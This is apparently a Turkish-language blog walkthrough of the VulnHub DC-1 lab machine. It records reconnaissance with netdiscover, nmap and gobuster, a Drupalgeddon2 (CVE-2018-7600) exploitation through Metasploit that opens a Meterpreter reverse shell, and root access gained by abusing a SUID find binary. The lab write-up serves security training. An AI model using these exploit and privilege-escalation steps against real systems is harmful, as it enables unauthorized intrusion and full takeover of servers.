---
title: "VULNHUB DC-1 Write Up"
date: 2020-09-26T15:05:32+03:00
draft: false
toc: true
images:
tags: [Vulnhub,write-up,find,drupal,CMS,Metasploit] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/dc-1,292/) 'da yer alan DC-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/vulnhub/dc1/cover.png
  
---
Merhaba, [VULNHUB](https://www.vulnhub.com/entry/dc-1,292/) 'da yer alan DC-1 adlı makinanın çözümüyle karşınızdayım. Keyifli okumalar...

## 1. Keşif Aşaması

Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.

```bash
netdiscover -i eth1
```

{{< image src="/images/vulnhub/dc1/netdiscover.png" alt="Hay aksi" position="center" style="border-radius: 8px;" >}}

İp adresi tespit edildikten sonra nmap ile makinenin tüm portları taranır. Açık portlarda çalışan servisler tespit edilir.
```bash
sudo nmap -sV -sC -p- 192.168.56.107
```
{{< image src="/images/vulnhub/dc1/nmap.png" alt="Hay aksi" position="center" style="border-radius: 8px;" >}}

80 portunda çalışan web servisine tarayıcından istek atılır. Ayrıca http-generator  bilgisinde Drupal 7 yazmaktadır. Google ile yapılan aramada CMS yazılımı olduğu görülmektedir.

{{< image src="/images/vulnhub/dc1/webpage.png" alt="Hay aksi" position="center" style="border-radius: 8px;" >}}

Web dizin taraması gerçekleştirilir.
```bash
gobuster dir -u http://192.168.56.107 -w /usr/share/wordlists/dirb/common.txt
```

```bash
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.107
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/24 10:03:45 Starting gobuster
===============================================================
/.history (Status: 403)
/.hta (Status: 403)
/.bash_history (Status: 403)
/.git/HEAD (Status: 403)
/.forward (Status: 403)
/.cvsignore (Status: 403)
/.cvs (Status: 403)
/.config (Status: 403)
/.cache (Status: 403)
/.bashrc (Status: 403)
/.htpasswd (Status: 403)
/.perf (Status: 403)
/.passwd (Status: 403)
/.profile (Status: 403)
/.mysql_history (Status: 403)
/.rhosts (Status: 403)
/.listings (Status: 403)
/.svn/entries (Status: 403)
/.svn (Status: 403)
/.subversion (Status: 403)
/.ssh (Status: 403)
/.listing (Status: 403)
/.sh_history (Status: 403)
/.web (Status: 403)
/.swf (Status: 403)
/.htaccess (Status: 403)
/0 (Status: 200)
/admin (Status: 403)
/Admin (Status: 403)
/ADMIN (Status: 403)
/batch (Status: 403)
/cgi-bin/ (Status: 403)
/Entries (Status: 403)
/includes (Status: 301)
/index.php (Status: 200)
/install.mysql (Status: 403)
/install.pgsql (Status: 403)
/LICENSE (Status: 200)
/misc (Status: 301)
/modules (Status: 301)
/node (Status: 200)
/profiles (Status: 301)
/README (Status: 200)
/robots (Status: 200)
/robots.txt (Status: 200)
/Root (Status: 403)
/scripts (Status: 301)
/search (Status: 403)
/Search (Status: 403)
/server-status (Status: 403)
/sites (Status: 301)
/themes (Status: 301)
/user (Status: 200)
/web.config (Status: 200)
/xmlrpc.php (Status: 200)
===============================================================
2020/09/24 10:13:18 Finished
===============================================================
```
İlk olarak robots.txt dosyasına göz gezdirilir.

```txt
User-agent: *
Crawl-delay: 10
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```

**/?p=** parametresi LFI, RFI açıklarının olabileceğini düşündürmektedir. Yapılan denemelerde başarılı olunamamıştır. ***web.config*** dikkat çekmektedir. İstek atıldığında xml verisi görülmektedir. LFI ve RFI gibi saldırıları önlemek için epey bir önlem alındığı görülmektedir. :pensive:

```xml
<configuration>
<system.webServer>
<!--
 Don't show directory listings for URLs which map to a directory. 
-->
<directoryBrowse enabled="false"/>
<rewrite>
<rules>
<rule name="Protect files and directories from prying eyes" stopProcessing="true">
<match url="\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)$|file*|Repository|Root|Tag|Template)$"/>
<action type="CustomResponse" statusCode="403" subStatusCode="0" statusReason="Forbidden" statusDescription="Access is forbidden."/>
</rule>
<rule name="Force simple error message for requests for non-existent favicon.ico" stopProcessing="true">
<match url="favicon\.ico"/>
<action type="CustomResponse" statusCode="404" subStatusCode="1" statusReason="File Not Found" statusDescription="The requested file favicon.ico was not found"/>
<conditions>
<add input="{REQUEST_FILENAME}" matchType="IsFile" negate="true"/>
</conditions>
</rule>
<!--
 Rewrite URLs of the form 'x' to the form 'index.php?q=x'. 
-->
<rule name="Short URLs" stopProcessing="true">
<match url="^(.*)$" ignoreCase="false"/>
<conditions>
<add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true"/>
<add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true"/>
<add input="{URL}" pattern="^/favicon.ico$" ignoreCase="false" negate="true"/>
</conditions>
<action type="Rewrite" url="index.php?q={R:1}" appendQueryString="true"/>
</rule>
</rules>
</rewrite>
<httpErrors>
<remove statusCode="404" subStatusCode="-1"/>
<error statusCode="404" prefixLanguageFilePath="" path="/index.php" responseMode="ExecuteURL"/>
</httpErrors>
<defaultDocument>
<!-- Set the default document -->
<files>
<remove value="index.php"/>
<add value="index.php"/>
</files>
</defaultDocument>
</system.webServer>
</configuration>
```
Google'da yapılan aramalarda CMS sürümünün eski olduğu tespit edilmiştir. Yapılan aramalarda *CVE-2018-7600* kodlu 'Drupalgeddon2' adında  RCE (Remote Code Execution) exploiti tespit edilir.(Exploitdb de yer alan exploit indirilip kullanılabilmektedir. Ben burada metasploit üzerinde exploit etme işlemi gerçekleştirdim.) 

## 2. Erişim Sağlanması

```bash
msfconsole -q
```
Metasploit açılır ve search komutu ile dropal ile ilgili arama gerçekleştirilir. Aynı exploit metasploit içerisinde yer almaktadır.

```bash
msf5 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
```
```bash
options #exploit kullanımı için gerekli parametler görüntülenir
set paramatre değer #parametreye değer set edilir.
exploit/run  #exploit çalıştırılır.
```
Dördüncü sırada yer alan exploit seçilir gerekli parametler ayarlamalar yapıldıktından sonra exploit/run komutu ile çalıştırılır ve meterpreter oturumu elde edilir. 

```bash
msf5 > use 4
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.56.107
RHOSTS => 192.168.56.107
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 192.168.56.105:4444 
[*] Sending stage (38288 bytes) to 192.168.56.107
[*] Meterpreter session 1 opened (192.168.56.105:4444 -> 192.168.56.107:40386) at 2020-09-24 12:16:50 -0500
```
```bash
meterpreter > getuid
Server username: www-data (33)

meterpreter > ls
Listing: /var/www
=================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  174    fil   2013-11-20 14:45:59 -0600  .gitignore
100644/rw-r--r--  5767   fil   2013-11-20 14:45:59 -0600  .htaccess
100644/rw-r--r--  1481   fil   2013-11-20 14:45:59 -0600  COPYRIGHT.txt
100644/rw-r--r--  1451   fil   2013-11-20 14:45:59 -0600  INSTALL.mysql.txt
100644/rw-r--r--  1874   fil   2013-11-20 14:45:59 -0600  INSTALL.pgsql.txt
100644/rw-r--r--  1298   fil   2013-11-20 14:45:59 -0600  INSTALL.sqlite.txt
100644/rw-r--r--  17861  fil   2013-11-20 14:45:59 -0600  INSTALL.txt
100755/rwxr-xr-x  18092  fil   2013-11-01 05:14:15 -0500  LICENSE.txt
100644/rw-r--r--  8191   fil   2013-11-20 14:45:59 -0600  MAINTAINERS.txt
100644/rw-r--r--  5376   fil   2013-11-20 14:45:59 -0600  README.txt
100644/rw-r--r--  9642   fil   2013-11-20 14:45:59 -0600  UPGRADE.txt
100644/rw-r--r--  6604   fil   2013-11-20 14:45:59 -0600  authorize.php
100644/rw-r--r--  720    fil   2013-11-20 14:45:59 -0600  cron.php
100644/rw-r--r--  52     fil   2019-02-19 07:20:46 -0600  flag1.txt
40755/rwxr-xr-x   4096   dir   2013-11-20 14:45:59 -0600  includes
100644/rw-r--r--  529    fil   2013-11-20 14:45:59 -0600  index.php
100644/rw-r--r--  703    fil   2013-11-20 14:45:59 -0600  install.php
40755/rwxr-xr-x   4096   dir   2013-11-20 14:45:59 -0600  misc
40755/rwxr-xr-x   4096   dir   2013-11-20 14:45:59 -0600  modules
40755/rwxr-xr-x   4096   dir   2013-11-20 14:45:59 -0600  profiles
100644/rw-r--r--  1561   fil   2013-11-20 14:45:59 -0600  robots.txt
40755/rwxr-xr-x   4096   dir   2013-11-20 14:45:59 -0600  scripts
40755/rwxr-xr-x   4096   dir   2013-11-20 14:45:59 -0600  sites
40755/rwxr-xr-x   4096   dir   2013-11-20 14:45:59 -0600  themes
100644/rw-r--r--  19941  fil   2013-11-20 14:45:59 -0600  update.php
100644/rw-r--r--  2178   fil   2013-11-20 14:45:59 -0600  web.config
100644/rw-r--r--  417    fil   2013-11-20 14:45:59 -0600  xmlrpc.php
```
```shell``` komutu ile normal oturuma geçilir. Daha sonra interaktif oturum için python pty modulü kullanılır. Daha sonra flag1.txt okunur. *(Meterpreter oturumu ile devam edilebilir ben kullanmayı sevmediğimden normal shelle geçiyorum.)*

{{< image src="/images/vulnhub/dc1/flag1.png" alt="Hay aksi" position="center" style="border-radius: 8px;" >}}

Home dizinine geçilerek diğer kullanılar tespit edilir. Flag4 adında bir kullanıcı dizini yer almaktadır. Dizin yetkilerine bakıldığında tüm kullanıcılar için okuma ve çalıştırma yetkileri bulunmaktadır.

{{< image src="/images/vulnhub/dc1/flag43.png" alt="Hay aksi" position="center" style="border-radius: 8px;" >}}

Dizin içerisinde yer alan flag4.txt okunur.

{{< image src="/images/vulnhub/dc1/flag44.png" alt="Hay aksi" position="center" style="border-radius: 8px;" >}}

## 3. Yetki Yükseltme

Sistem suid biti aktif olan dosyalar için arama yapılır.

```bash
www-data@DC-1:/$ find / -perm -u=s -type f 2>/dev/null

/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
www-data@DC-1:/$ 
```
find komutu dikkat çekmektedir. find komutu -exec parametresi ile komut çalıştırabilmektedir.

```bash
find . -exec /bin/sh \; -quit
```
Komut çalıştırıldıktan sonra www-data kullanıcısının efektif user id değeri ve grubunun root olarak set edildiği görülmektedir. Daha sonra /root dizinine gidilerek flag edeği okunarak makina çözümlemesi tamamlanır.

{{< image src="/images/vulnhub/dc1/flagson.png" alt="Hay aksi" position="center" style="border-radius: 8px;" >}}

